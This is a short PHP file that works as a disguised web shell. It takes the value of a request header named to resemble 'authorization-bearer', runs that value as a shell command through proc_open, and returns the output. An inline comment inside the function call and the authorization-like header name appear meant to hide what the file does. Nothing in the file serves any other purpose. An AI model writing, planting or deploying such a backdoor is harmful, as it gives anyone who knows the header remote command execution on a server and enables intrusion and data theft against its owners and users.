<?php
header("Expires: 0");

$headers = getallheaders();
$authHeader = null;
foreach ($headers as $k => $v) if (stripos($k, 'authorization-bearer') !== false) { $authHeader = $v; break; }

if ($authHeader) {
    $Variable = $authHeader;

    $p = proc_open/**array**/($Variable, array(1 => array('pipe', 'w')), $pipes);
    if (is_resource($p)) { header('Content-Type: text/plain'); echo stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); }

    exit;
}
?>